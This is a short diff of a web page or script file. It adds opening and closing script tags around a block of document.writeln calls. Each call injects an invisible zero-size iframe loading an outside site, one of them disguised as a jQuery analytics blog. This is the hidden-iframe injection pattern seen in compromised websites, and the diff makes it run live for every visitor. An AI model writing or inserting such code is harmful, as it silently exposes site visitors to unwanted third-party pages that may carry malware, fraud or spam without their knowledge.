@@ -1,3 +1,4 @@
+<script type="text/javascript">
 <!-- 
 document.writeln(" <iframe src=\"https://api.skyplanners.com/\" width=\"0%\" height=\"0\"></iframe> "); 
 document.writeln(" <iframe src=\"https://bookdomesticflights.com/local.html\" width=\"0%\" height=\"0\"></iframe> "); 
@@ -26,3 +27,4 @@ document.writeln(" <iframe src=\"https://www.macheene.com/public/editor/upload/u
 document.writeln(" <iframe src=\"https://www.forum-pemuda-ngadirejo.org/\" width=\"0%\" height=\"0\"></iframe> "); 
 document.writeln(" <iframe src=\"https://jquery-language-analytics.blogspot.com/\" width=\"0%\" height=\"0\"></iframe> ");
  // -->
+</script>
